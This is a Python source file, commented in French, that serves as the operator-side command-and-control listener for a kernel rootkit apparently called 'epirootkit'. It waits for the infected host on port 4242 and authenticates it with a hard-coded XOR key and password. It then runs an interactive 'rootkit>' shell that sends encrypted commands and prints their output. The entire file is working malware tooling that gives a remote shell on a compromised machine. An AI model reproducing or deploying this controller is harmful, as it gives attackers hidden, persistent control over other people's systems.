import socket

# Correction de la clé XOR pour correspondre au rootkit
KEY = b"epirootkit"
HOST = "0.0.0.0"
PORT = 4242

def xor(data: bytes) -> bytes:
    key_bytes = KEY
    result = bytearray()
    for i, b in enumerate(data):
        result.append(b ^ key_bytes[i % len(key_bytes)])
    return bytes(result)

def handle_client(client):
    try:
        # Envoyer le mot de passe chiffré
        password = b"epirootkit\n"  # Le \n est important pour correspondre au module kernel
        encrypted_pass = xor(password)
        client.sendall(encrypted_pass)

        # Recevoir et déchiffrer la réponse
        auth_response_encrypted = client.recv(2048)
        if not auth_response_encrypted:
            print("No response received")
            return

        auth_response = xor(auth_response_encrypted).decode('ascii', errors="ignore")
        print("--- AUTH ---")
        print(auth_response.strip())
        print("------------\n")

        if "FAIL" in auth_response:
            print("Authentication failed. Exiting.")
            return

        # Si l'authentification réussit, on continue avec le shell
        while True:
            try:
                cmd = input("rootkit> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    break

                # Chiffrer et envoyer la commande
                encrypted_cmd = xor(cmd.encode() + b"\n")
                client.sendall(encrypted_cmd)

                # Recevoir et déchiffrer la réponse
                response_encrypted = client.recv(2048)
                if response_encrypted:
                    response = xor(response_encrypted).decode('ascii', errors="ignore")
                    print(response.strip())

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error during command execution: {e}")
                break

    except Exception as e:
        print(f"Error handling client: {e}")
        return

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Waiting for connection on {HOST}:{PORT}...")

        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        handle_client(client)

if __name__ == "__main__":
    main()